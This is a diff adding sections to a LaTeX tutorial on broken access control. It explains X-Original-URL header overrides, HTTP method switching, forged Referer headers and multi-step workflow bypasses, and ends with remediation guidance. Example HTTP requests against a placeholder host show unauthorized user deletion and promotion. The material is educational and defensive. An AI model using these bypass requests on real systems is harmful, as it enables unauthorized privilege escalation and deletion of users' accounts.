@@ -266,4 +266,272 @@ https://example.com/view_document?doc_id=1002
     \item \textbf{Critical severity:} A simple IDOR can lead to complete system takeover if admin accounts are accessible.
 \end{itemize}
 
+
+\section*{4- \underline{URL-Based Access Control Circumvented}}
+
+\subsection*{The Vulnerability}
+Some applications enforce access control at the platform layer (e.g., a web server or WAF) by blocking access to specific URLs based on user roles. However, if the application supports non-standard HTTP headers like \texttt{X-Original-URL} or \texttt{X-Rewrite-URL}, attackers can bypass these front-end controls by providing a different URL in the header that the back-end processes instead.
+
+\subsection*{Attack Example: Bypassing Admin Panel Restriction}
+
+\begin{enumerate}
+    \item \textbf{Initial Blocked Request:}
+    \begin{lstlisting}
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+    \end{lstlisting}
+    \textit{Response: 403 Forbidden (blocked by front-end control)}
+
+\newpage
+    \item \textbf{Bypass Using Header Override:}
+    \begin{lstlisting}
+POST / HTTP/1.1
+Host: vulnerable-website.com
+X-Original-URL: /admin
+    \end{lstlisting}
+    \textit{Response: 200 OK - Admin panel loaded (back-end processed the header)}
+
+    \item \textbf{Deleting a User:}
+    \begin{lstlisting}
+POST /?username=carlos HTTP/1.1
+Host: vulnerable-website.com  
+X-Original-URL: /admin/delete
+    \end{lstlisting}
+    \textit{Response: User 'carlos' successfully deleted}
+\end{enumerate}
+
+\subsection*{Why This Works}
+\begin{itemize}
+    \item \textbf{Front-end:} Blocks requests to \texttt{/admin/*} URLs
+    \item \textbf{Back-end:} Processes the URL from \texttt{X-Original-URL} header instead of the actual request line
+    \item \textbf{Result:} Front-end controls are completely bypassed
+\end{itemize}
+
+
+\section*{5- \underline{Method-Based Access Control Circumvented}}
+
+\subsection*{The Vulnerability}
+Some applications enforce access control based on both the URL \textbf{and HTTP method} (e.g., blocking \texttt{POST /admin/promote}). However, if the application accepts alternative HTTP methods to perform the same action, attackers can bypass these controls by using permitted methods to access restricted functionality.
+
+\subsection*{Attack Example: Promoting Users via Method Manipulation}
+
+\begin{enumerate}
+    \item \textbf{Admin's Original Request (Blocked for Non-Admins):}
+    \begin{lstlisting}
+POST /admin/promote HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=admin_session_token
+
+username=carlos&action=promote
+    \end{lstlisting}
+    \textit{Response: 200 OK - User promoted}
+
+    \item \textbf{Non-Admin Attempt (Blocked):}
+    \begin{lstlisting}
+POST /admin/promote HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=user_session_token
+
+username=carlos&action=promote
+    \end{lstlisting}
+    \textit{Response: 401 Unauthorized}
+
+    \item \textbf{Method Manipulation Bypass:}
+    \begin{lstlisting}
+GET /admin/promote?username=carlos&action=promote HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=user_session_token
+    \end{lstlisting}
+    \textit{Response: 200 OK - User successfully promoted}
+\end{enumerate}
+
+\subsection*{Why This Works}
+\begin{itemize}
+    \item \textbf{Front-end Controls:} Block \texttt{POST} requests to \texttt{/admin/promote} for non-admin users
+    \item \textbf{Back-end Logic:} Processes both \texttt{POST} and \texttt{GET} methods for the same functionality
+    \item \textbf{Vulnerability:} Front-end doesn't block \texttt{GET} requests to the same endpoint
+    \item \textbf{Result:} Access controls bypassed by changing HTTP method
+\end{itemize}
+
+\subsection*{Alternative Attack Vectors}
+\begin{itemize}
+    \item Changing \texttt{POST} to \texttt{POSTX} to test parser tolerance
+    \item Using \texttt{PUT}, \texttt{PATCH}, or custom HTTP methods
+    \item Parameter shifting from body to URL parameters
+\end{itemize}
+
+
+\section*{6- \underline{Referer-Based Access Control Bypass}}
+
+\subsection*{The Vulnerability}
+Some applications implement access control checks based on the \texttt{Referer} HTTP header, which indicates the previous page the user visited. This is insecure because attackers can easily manipulate this header to bypass authorization checks.
+
+\subsection*{How It Works}
+\begin{itemize}
+    \item Application checks if \texttt{Referer} header contains authorized page (e.g., \texttt{/admin})
+    \item If \texttt{Referer} matches, request is allowed regardless of user permissions
+    \item Attackers can forge the \texttt{Referer} header to bypass these checks
+\end{itemize}
+
+\subsection*{Attack Example: Bypassing Admin Function Protection}
+
+\begin{enumerate}
+    \item \textbf{Legitimate Admin Request:}
+    \begin{lstlisting}
+POST /admin/deleteUser HTTP/1.1
+Host: vulnerable-website.com
+Referer: https://vulnerable-website.com/admin
+Cookie: session=admin_session
+
+username=carlos
+    \end{lstlisting}
+    \textit{Response: 200 OK - User deleted}
+
+    \item \textbf{Non-Admin Without Referer (Blocked):}
+    \begin{lstlisting}
+POST /admin/deleteUser HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=user_session
+
+username=carlos
+    \end{lstlisting}
+    \textit{Response: 403 Forbidden - Missing Referer}
+
+    \item \textbf{Non-Admin With Forged Referer (Bypass):}
+    \begin{lstlisting}
+POST /admin/deleteUser HTTP/1.1
+Host: vulnerable-website.com
+Referer: https://vulnerable-website.com/admin
+Cookie: session=user_session
+
+username=carlos
+    \end{lstlisting}
+    \textit{Response: 200 OK - User deleted (bypassed!)}
+\end{enumerate}
+
+\subsection*{Why This is Insecure}
+\begin{itemize}
+    \item \textbf{Client-Controlled:} \texttt{Referer} header is fully controllable by the client
+    \item \textbf{No Authentication:} Checks page origin instead of user permissions
+    \item \textbf{Easy Bypass:} Simply add the required \texttt{Referer} header to any request
+    \item \textbf{False Security:} Creates illusion of protection while being easily bypassable
+\end{itemize}
+
+\section*{7- \underline{Multi-Step Process Access Control Bypass}}
+
+\subsection*{The Vulnerability}
+When applications implement multi-step processes, they often enforce access controls on initial steps but neglect final confirmation steps, assuming users can only reach them through the proper workflow. Attackers can bypass these controls by directly accessing unprotected final steps.
+
+\subsection*{Common Scenario}
+\begin{itemize}
+    \item \textbf{Step 1:} Load user details form (\textit{Access controlled})
+    \item \textbf{Step 2:} Submit changes (\textit{Access controlled}) 
+    \item \textbf{Step 3:} Review and confirm changes (\textit{No access control})
+    \item \textbf{Flaw:} Assumption that users reach Step 3 only after completing controlled steps
+\end{itemize}
+
+\subsection*{Attack Example: User Promotion Bypass}
+
+\begin{enumerate}
+    \item \textbf{Step 1 - Admin Loads Form (Controlled):}
+    \begin{lstlisting}
+GET /admin/load-user-form?user=carlos HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=admin_session
+    \end{lstlisting}
+    \textit{Response: 200 OK - Form loaded}
+
+    \item \textbf{Step 2 - Admin Submits Changes (Controlled):}
+    \begin{lstlisting}
+POST /admin/submit-changes HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=admin_session
+
+user=carlos&role=admin
+    \end{lstlisting}
+    \textit{Response: 200 OK - Changes submitted}
+
+    \item \textbf{Step 3 - Final Confirmation (Unprotected):}
+    \begin{lstlisting}
+POST /admin/confirm-changes HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=user_session
+
+user=carlos&role=admin&confirm=true
+    \end{lstlisting}
+    \textit{Response: 200 OK - Changes confirmed (bypassed!)}
+\end{enumerate}
+
+\subsection*{Why This Works}
+\begin{itemize}
+    \item \textbf{Inconsistent Controls:} Access checks applied unevenly across workflow
+    \item \textbf{Faulty Assumption:} Trusts that users follow intended sequence
+    \item \textbf{Direct Access:} Attackers can skip to unprotected final step
+    \item \textbf{Parameter Reuse:} Same parameters work across all steps
+\end{itemize}
+
+
+\section*{Remediation and Prevention}
+
+\subsection*{\underline{Fundamental Principles}}
+
+\subsubsection*{1. Principle of Least Privilege}
+\begin{itemize}
+    \item Users should only have the minimum permissions necessary to perform their tasks
+    \item Regularly review and audit user privileges
+    \item Implement role-based access control (RBAC) with clearly defined permissions
+\end{itemize}
+
+\subsubsection*{2. Never Trust Client-Side Controls}
+\begin{itemize}
+    \item \textbf{All access control decisions must be made server-side}
+    \item Never rely on hidden fields, cookies, or client-side JavaScript for authorization
+    \item Validate permissions for every request, regardless of the user interface
+\end{itemize}
+
+\subsubsection*{3. Deny by Default}
+\begin{itemize}
+    \item Default to denying access unless explicitly authorized
+    \item Implement fail-secure mechanisms that block access when errors occur
+\end{itemize}
+
+\subsection*{\underline{Technical Implementation Guidelines}}
+
+\subsubsection*{Authentication \& Session Management}
+\begin{itemize}
+    \item Implement strong, multi-factor authentication for sensitive operations
+    \item Use secure, random session identifiers that expire properly
+    \item Invalidate sessions after logout, password changes, and periods of inactivity
+\end{itemize}
+
+\subsubsection*{Authorization Checks}
+\begin{itemize}
+    \item Use a centralized access control mechanism
+    \item Apply the same authorization logic consistently across all endpoints
+    \item Verify permissions for both the resource AND the action being performed
+\end{itemize}
+
+\subsubsection*{IDOR Prevention}
+\begin{itemize}
+    \item Use indirect reference maps instead of direct object references
+    \item Implement proper authorization checks for each object access
+    \item Consider using UUIDs instead of sequential IDs, but don't rely on obscurity
+\end{itemize}
+
+\subsubsection*{API \& Endpoint Security}
+\begin{itemize}
+    \item Document all API endpoints and their required permissions
+    \item Use standardized authentication methods (OAuth 2.0, JWT)
+    \item Implement rate limiting and monitor for suspicious access patterns
+\end{itemize}
+
+\subsubsection*{Multi-Step Process Security}
+\begin{itemize}
+    \item Maintain server-side state for workflows
+    \item Validate completion of previous steps before allowing progression
+    \item Use unique, single-use tokens for each step
+\end{itemize}
+
+
+
 \end{document}
